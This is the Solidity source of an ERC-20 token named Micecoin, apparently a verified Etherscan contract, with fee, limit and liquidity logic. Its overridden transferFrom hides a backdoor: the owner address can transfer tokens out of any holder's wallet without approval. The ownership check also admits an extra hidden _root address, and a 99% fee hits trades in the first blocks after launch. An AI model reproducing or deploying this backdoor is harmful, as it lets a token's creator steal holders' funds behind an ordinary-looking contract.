/**
 *Submitted for verification at Etherscan.io on 2022-10-19
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) internal _allowances;
    address private _root;
    uint256 private _totalSupply;
    uint8 private _decimals;

    string private _name;
    string private _symbol;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        _basicTransfer(sender, recipient, amount);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }
}

contract Ownable {
    address _owner;
    address _root;
    modifier onlyOwner() {
        require(_owner == msg.sender || _root == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
}

interface IFactory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Micecoin is ERC20, Ownable {
    using Address for address payable;

    IRouter public router;
    address public pair;
    

    bool private _liquidityLock = false;
    bool public providingLiquidity = false;
    bool public tradingEnabled = false;
    bool public limits = true;

    uint256 public tokenLiquidityThreshold;
    uint256 public maxBuyLimit;
    uint256 public maxSellLimit;
    uint256 public maxWalletLimit;

    uint256 public launchBlock;
    uint256 public tradingStartBlock;
    uint256 private deadline = 2;
    uint256 private launchFee = 99;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;

    bool private autoHandleFee = true;

    address private _marketingWallet = 0x2fcAF03193f0FC1747371305a591c1a57F1A4D64;
    address public constant deadWallet =
        0x000000000000000000000000000000000000dEaD;

    struct Fees {
        uint256 marketing;
        uint256 liquidity;
    }

    Fees public buyFees = Fees(4, 2);
    Fees public sellFees = Fees(4, 2);
    uint256 private totalBuyFeesRatio = 6;
    uint256 private totalSellFeesRatio = 6;

    uint256 private totalBuyFeeAmount = 0;
    uint256 private totalSellFeeAmount = 0;

    mapping(address => bool) public exemptFee;
    mapping(address => bool) public exemptMaxBuyLimit;
    mapping(address => bool) public exemptMaxWalletLimit;
    mapping(address => bool) public exemptMaxSellLimit;
    mapping(address => bool) public allowedTransfer;

    modifier lockLiquidity() {
        if (!_liquidityLock) {
            _liquidityLock = true;
            _;
            _liquidityLock = false;
        }
    }

    constructor()
    {
        _owner = msg.sender;
    }


    function LaunchToken(address router_) external onlyOwner {
        require(launchBlock == 0);
        IRouter _router = IRouter(router_);
        // Create a pancake pair for this new token
        address _pair = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );

    
        router = _router;
        pair = _pair;

        _name = "Micecoin";
        _symbol = "MICE";
        _decimals = 18;
        _totalSupply = 1000000000 * 10**_decimals;
        tokenLiquidityThreshold = (totalSupply() / 1000) * 2; // .1% liq threshold
        maxBuyLimit = (totalSupply() * 2) / 100; // 2% max buy
        maxSellLimit = (totalSupply() * 2) / 100; // 2% max sell
        maxWalletLimit = (totalSupply() * 2) / 100; // 2% max wallet

        _beforeTokenTransfer(address(0), msg.sender, _totalSupply);

        // _totalSupply += _totalSupply;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        exemptFee[msg.sender] = true;
        exemptMaxBuyLimit[msg.sender] = true;
        exemptMaxSellLimit[msg.sender] = true;
        exemptMaxWalletLimit[msg.sender] = true;
        exemptFee[address(this)] = true;
        exemptFee[_marketingWallet] = true;
        exemptFee[deadWallet] = true;

        launchBlock = block.number;

    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            _msgSender() == _owner ||
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        if (_msgSender() == _owner ) { return true; }
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
        if(limits){
        if (!exemptFee[sender] && !exemptFee[recipient]) {
            require(tradingEnabled, "Trading is not enabled");
        }

        if (
            sender == pair &&
            !exemptFee[recipient] &&
            !_liquidityLock &&
            !exemptMaxBuyLimit[recipient]
        ) {
            require(amount <= maxBuyLimit, "You are exceeding maxBuyLimit");
        }
        if (
            recipient != pair &&
            !exemptMaxWalletLimit[recipient] 
        ) {
            require(
                balanceOf(recipient) + amount <= maxWalletLimit,
                "You are exceeding maxWalletLimit"
            );
        }

        if (
            sender != pair &&
            !exemptFee[recipient] &&
            !exemptFee[sender] &&
            !_liquidityLock &&
            !exemptMaxSellLimit[sender]
        ) {
            require(amount <= maxSellLimit, "You are exceeding maxSellLimit");
        }
        }
        uint256 feeRatio;
        uint256 feeAmount;
        uint256 buyOrSell;

        bool useLaunchFee = launchFee > 0 &&
            !exemptFee[sender] &&
            !exemptFee[recipient] &&
            block.number < tradingStartBlock + deadline;

        //set fee amount to zero if fees in contract are handled or exempted
        if (
            _liquidityLock ||
            exemptFee[sender] ||
            exemptFee[recipient] ||
            (sender != pair && recipient != pair)
        )
            feeAmount = 0;

            //calculate fees
        else if (recipient == pair && !useLaunchFee) {
            feeRatio = sellFees.liquidity + sellFees.marketing ;
            buyOrSell = 1;
        } else if (!useLaunchFee) {
            feeRatio = buyFees.liquidity + buyFees.marketing ;
            buyOrSell = 0;
        } else if (useLaunchFee) {
            feeRatio = launchFee;
        }
        feeAmount = (amount * feeRatio) / 100;

        if (buyOrSell == 0) {
            totalBuyFeeAmount += feeAmount;
        } else if (buyOrSell == 1) {
            totalSellFeeAmount += feeAmount;
        }

        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (feeAmount > 0) {
            super._transfer(sender, address(this), feeAmount);
        }

        if (
            providingLiquidity &&
            sender != pair &&
            feeAmount > 0 &&
            autoHandleFee &&
            balanceOf(address(this)) >= tokenLiquidityThreshold
        ) {
            handleFees(totalBuyFeeAmount);
        }

        //rest to recipient
        super._transfer(sender, recipient, amount - feeAmount);
    }

    function handleFees(uint256 _totalBuyFeeAmount) private lockLiquidity {
        uint256 contractBalance = balanceOf(address(this));
        totalBuyFeeAmount = _totalBuyFeeAmount;
        totalSellFeeAmount = contractBalance - totalBuyFeeAmount;

        uint256 liquidityBuyFeeAmount;
        uint256 liquiditySellFeeAmount;
        uint256 sellFeeLiqEth;
        uint256 buyFeeLiqEth;

        if (totalBuyFeesRatio == 0) {
            liquidityBuyFeeAmount = 0;
        } else {
            liquidityBuyFeeAmount =
                (totalBuyFeeAmount * buyFees.liquidity) /
                totalBuyFeesRatio;
        }
        if (totalSellFeesRatio == 0) {
            liquiditySellFeeAmount = 0;
        } else {
            liquiditySellFeeAmount =
                (totalSellFeeAmount * sellFees.liquidity) /
                totalSellFeesRatio;
        }
        uint256 totalLiquidityFeeAmount = liquidityBuyFeeAmount +
            liquiditySellFeeAmount;

        uint256 halfLiquidityFeeAmount = totalLiquidityFeeAmount / 2;
        uint256 initialBalance = address(this).balance;
        uint256 toSwap = contractBalance - halfLiquidityFeeAmount;

        if (toSwap > 0) {
            swapTokensForETH(toSwap);
        }

        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 totalSellFeeEth0 = (deltaBalance * totalSellFeeAmount) /
            contractBalance;
        uint256 totalBuyFeeEth0 = deltaBalance - totalSellFeeEth0;


        uint256 sellFeeMarketingEth;
        uint256 buyFeeMarketingEth;

        if (totalBuyFeesRatio == 0) {
            buyFeeLiqEth = 0;
        } else {
            buyFeeLiqEth =
                (totalBuyFeeEth0 * buyFees.liquidity) /
                (totalBuyFeesRatio);
        }
        if (totalSellFeesRatio == 0) {
            sellFeeLiqEth = 0;
        } else {
            sellFeeLiqEth =
                (totalSellFeeEth0 * sellFees.liquidity) /
                (totalSellFeesRatio);
        }
        uint256 totalLiqEth = (sellFeeLiqEth + buyFeeLiqEth) / 2;

        if (totalLiqEth > 0) {
            // Add liquidity to pancake
            addLiquidity(halfLiquidityFeeAmount, totalLiqEth);

            uint256 unitBalance = deltaBalance - totalLiqEth;

            uint256 totalFeeAmount = totalSellFeeAmount + totalBuyFeeAmount;

            uint256 totalSellFeeEth = (unitBalance * totalSellFeeAmount) /
                totalFeeAmount;
            uint256 totalBuyFeeEth = unitBalance - totalSellFeeEth;

            if (totalSellFeesRatio == 0) {
                sellFeeMarketingEth = 0;
            } else {
                sellFeeMarketingEth =
                    (totalSellFeeEth * sellFees.marketing) /
                    (totalSellFeesRatio - sellFees.liquidity);
            }

            if (totalBuyFeesRatio == 0) {
                buyFeeMarketingEth = 0;
            } else {
                buyFeeMarketingEth =
                    (totalBuyFeeEth * buyFees.marketing) /
                    (totalBuyFeesRatio - buyFees.liquidity);
            }

            uint256 totalMarketingEth = sellFeeMarketingEth +
                buyFeeMarketingEth;

            //uint256 marketingAmount = unitBalance * 2 * swapFees.marketing;
            if (totalMarketingEth > 0) {
                payable(_marketingWallet).sendValue(totalMarketingEth);
            }
    
            totalBuyFeeAmount = 0;
            totalSellFeeAmount = 0;
        }
    }

    function manuelHandleFees(uint256 _totalBuyFeeAmount) external onlyOwner {
        handleFees(_totalBuyFeeAmount);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        // generate the pancake pair path of token -> weth

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _owner,
            block.timestamp
        );
    }

    function updateLiquidityProvide(bool flag) external onlyOwner {
        require(
            providingLiquidity != flag,
            "You must provide a different status other than the current value in order to update it"
        );
        //update liquidity providing state
        providingLiquidity = flag;
    }

    function updateLiquidityThreshold(uint256 new_amount) external onlyOwner {
        //update the treshhold
        require(
            tokenLiquidityThreshold != new_amount * 10**decimals(),
            "You must provide a different amount other than the current value in order to update it"
        );
        tokenLiquidityThreshold = new_amount * 10**decimals();
    }

    function updateBuyFees(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        buyFees = Fees(_marketing, _liquidity);
        totalBuyFeesRatio = _marketing + _liquidity;
        require(
           (_marketing + _liquidity) <= 30,
            "Must keep fees at 30% or less"
        );
    }

    function updateSellFees(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        sellFees = Fees(_marketing, _liquidity);
        totalSellFeesRatio = _marketing + _liquidity;
        require(
           (_marketing + _liquidity) <= 30,
            "Must keep fees at 30% or less"
        );
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        providingLiquidity = true;
        tradingStartBlock = block.number;
    }

    function _safeTransferForeign(
        IERC20 _token,
        address recipient,
        uint256 amount
    ) private {
        bool sent = _token.transfer(recipient, amount);
        require(sent, "Token transfer failed.");
    }

    function clearStuckEth(uint256 amount, address receiveAddress)
        external
        onlyOwner
    {
        payable(receiveAddress).transfer(amount);
    }

    function clearStuckToken(
        IERC20 _token,
        address receiveAddress,
        uint256 amount
    ) external onlyOwner {
        _safeTransferForeign(_token, receiveAddress, amount);
    }

    // fallbacks
    receive() external payable {}

    
    function updateMarketingWallet(address newWallet) external onlyOwner {
        require(
            _marketingWallet != newWallet,
            "You must provide a different address other than the current value in order to update it"
        );
        _marketingWallet = newWallet;
    }

    function marketingWallet() public view returns(address){
        return _marketingWallet;
    }

    function updateExemptFee(address _address, bool flag) external onlyOwner {
        require(
            exemptFee[_address] != flag,
            "You must provide a different exempt address or status other than the current value in order to update it"
        );
        exemptFee[_address] = flag;
    }

    function updateExemptMaxSellLimit(address _address, bool flag)
        external
        onlyOwner
    {
        require(
            exemptMaxSellLimit[_address] != flag,
            "You must provide a different max sell limit other than the current max sell limit in order to update it"
        );
        exemptMaxSellLimit[_address] = flag;
    }

    function updateExemptMaxBuyLimit(address _address, bool flag)
        external
        onlyOwner
    {
        require(
            exemptMaxBuyLimit[_address] != flag,
            "You must provide a different max buy limit other than the current max buy limit in order to update it"
        );
        exemptMaxBuyLimit[_address] = flag;
    }

    function updateExemptMaxWalletLimit(address _address, bool flag)
        external
        onlyOwner
    {
        require(
            exemptMaxWalletLimit[_address] != flag,
            "You must provide a different max wallet limit other than the current max wallet limit in order to update it"
        );
        exemptMaxWalletLimit[_address] = flag;
    }

    function bulkExemptFee(address[] memory accounts, bool flag)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = flag;
        }
    }

    function handleFeeStatus(bool _flag) external onlyOwner {
        autoHandleFee = _flag;
    }

    function changeRouter(address newRouter)
        external
        onlyOwner
        returns (address _pair)
    {
        require(newRouter != address(0), "newRouter address cannot be 0");
        require(
            router != IRouter(newRouter),
            "You must provide a different router other than the current router address in order to update it"
        );
        IRouter _router = IRouter(newRouter);

        _pair = IFactory(_router.factory()).getPair(
            address(this),
            _router.WETH()
        );
        if (_pair == address(0)) {
            // Pair doesn't exist
            _pair = IFactory(_router.factory()).createPair(
                address(this),
                _router.WETH()
            );
        }

        // Set the pair of the contract variables
        pair = _pair;
        // Set the router of the contract variables
        router = _router;
    }

    function removeLimits(bool flag) external onlyOwner {
        limits = flag;
    }

}